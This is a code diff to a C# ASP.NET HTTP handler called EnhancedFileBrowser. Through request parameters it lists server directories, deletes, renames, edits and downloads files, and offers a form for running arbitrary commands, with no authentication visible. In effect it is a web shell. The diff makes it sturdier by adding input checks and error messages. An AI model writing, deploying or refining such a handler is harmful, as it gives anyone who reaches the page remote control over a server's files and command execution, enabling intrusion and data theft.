@@ -13,9 +13,11 @@ public class EnhancedFileBrowser : IHttpHandler
 
         string action = context.Request["action"];
         string currentPath = context.Request["path"];
-        if (string.IsNullOrEmpty(currentPath) || !Directory.Exists(currentPath))
+
+        // Validate and set default path if needed
+        if (string.IsNullOrWhiteSpace(currentPath) || !Directory.Exists(currentPath))
         {
-            currentPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // default folder
+            currentPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
         }
 
         StringBuilder html = new StringBuilder();
@@ -87,6 +89,8 @@ public class EnhancedFileBrowser : IHttpHandler
             if (action == "delete")
             {
                 string target = context.Request["path"];
+                if (string.IsNullOrWhiteSpace(target))
+                    return "<span class='error'>Delete failed: Path parameter missing.</span>";
                 if (File.Exists(target))
                 {
                     File.Delete(target);
@@ -106,7 +110,10 @@ public class EnhancedFileBrowser : IHttpHandler
             {
                 string target = context.Request["path"];
                 string newName = context.Request["newname"];
-                if (string.IsNullOrEmpty(newName)) return "<span class='error'>New name was empty.</span>";
+                if (string.IsNullOrWhiteSpace(target))
+                    return "<span class='error'>Rename failed: Original path missing.</span>";
+                if (string.IsNullOrWhiteSpace(newName))
+                    return "<span class='error'>Rename failed: New name missing.</span>";
                 string newFullPath = Path.Combine(Path.GetDirectoryName(target), newName);
                 if (File.Exists(target))
                 {
@@ -127,12 +134,13 @@ public class EnhancedFileBrowser : IHttpHandler
             }
             else if (action == "editform")
             {
-                // Show edit form handled in RenderFileBrowser
-                return null;
+                return null; // handled in render
             }
             else if (action == "saveedit")
             {
                 string filePath = context.Request["path"];
+                if (string.IsNullOrWhiteSpace(filePath))
+                    return "<span class='error'>Save failed: Path missing.</span>";
                 if (File.Exists(filePath))
                 {
                     string content = context.Request.Form["filecontent"];
@@ -148,24 +156,22 @@ public class EnhancedFileBrowser : IHttpHandler
             else if (action == "newfolder")
             {
                 string folderName = context.Request["foldername"];
-                if (!string.IsNullOrEmpty(folderName))
+                if (string.IsNullOrWhiteSpace(folderName))
+                    return "<span class='error'>Folder creation failed: Folder name missing.</span>";
+                string newDir = Path.Combine(currentPath, folderName);
+                if (!Directory.Exists(newDir))
                 {
-                    string newDir = Path.Combine(currentPath, folderName);
-                    if (!Directory.Exists(newDir))
-                    {
-                        Directory.CreateDirectory(newDir);
-                        return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(folderName)}' created.</span>";
-                    }
-                    else
-                    {
-                        return $"<span class='error'>Folder already exists.</span>";
-                    }
+                    Directory.CreateDirectory(newDir);
+                    return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(folderName)}' created.</span>";
                 }
-                return null;
+                else
+                {
+                    return $"<span class='error'>Folder already exists.</span>";
+                }
             }
             else if (action == "cmdexec")
             {
-                // command execution handled separately
+                // handled in render
                 return null;
             }
         }
@@ -173,7 +179,6 @@ public class EnhancedFileBrowser : IHttpHandler
         {
             return $"<span class='error'>Error: {HttpUtility.HtmlEncode(ex.Message)}</span>";
         }
-
         return null;
     }
 
@@ -181,11 +186,10 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         StringBuilder sb = new StringBuilder();
         sb.Append($"<h2>Browsing: {HttpUtility.HtmlEncode(path)}</h2>");
-
         sb.Append(@"<form method='get'>
             <input type='hidden' name='action' value='newfolder'/>
             <input type='hidden' name='path' value='" + HttpUtility.HtmlEncode(path) + @"'/>
-            New Folder Name: <input type='text' name='foldername'/>
+            New Folder Name: <input type='text' name='foldername' required />
             <input type='submit' value='Create'/>
             </form><hr/>");
 
@@ -232,7 +236,7 @@ public class EnhancedFileBrowser : IHttpHandler
         if (context.Request["action"] == "editform")
         {
             string editPath = context.Request["path"];
-            if (File.Exists(editPath))
+            if (!string.IsNullOrWhiteSpace(editPath) && File.Exists(editPath))
             {
                 string content = File.ReadAllText(editPath);
                 sb.Append("<hr/><h3>Editing File: " + HttpUtility.HtmlEncode(editPath) + "</h3>");
@@ -245,7 +249,7 @@ public class EnhancedFileBrowser : IHttpHandler
                 sb.Append("<input type='submit' value='Save File'/>");
                 sb.Append("</form>");
             }
-            else
+            else if (!string.IsNullOrWhiteSpace(editPath))
             {
                 sb.Append("<p class='error'>File not found for editing.</p>");
             }
@@ -260,7 +264,7 @@ public class EnhancedFileBrowser : IHttpHandler
         sb.Append("<h2>Command Execution</h2>");
         sb.Append($@"<form method='post'>
             <input type='hidden' name='action' value='cmdexec'/>
-            <textarea name='cmdtext' rows='10' cols='80' style='width:100%;font-family:monospace;'></textarea><br/>
+            <textarea name='cmdtext' rows='10' cols='80' style='width:100%;font-family:monospace;' placeholder='Enter command here'></textarea><br/>
             <input type='submit' value='Run Command'/>
             </form><hr/>");
 
@@ -316,6 +320,9 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         try
         {
+            if (string.IsNullOrWhiteSpace(file) || !File.Exists(file))
+                return "<p class='error'>Download failed: File not found.</p>";
+
             var fi = new FileInfo(file);
             context.Response.Clear();
             context.Response.ContentType = "application/octet-stream";
@@ -324,7 +331,7 @@ public class EnhancedFileBrowser : IHttpHandler
             context.Response.TransmitFile(file);
             context.Response.Flush();
             context.Response.End();
-            return null; // will never reach here
+            return null; // This line will not be reached after Response.End()
         }
         catch (Exception ex)
         {
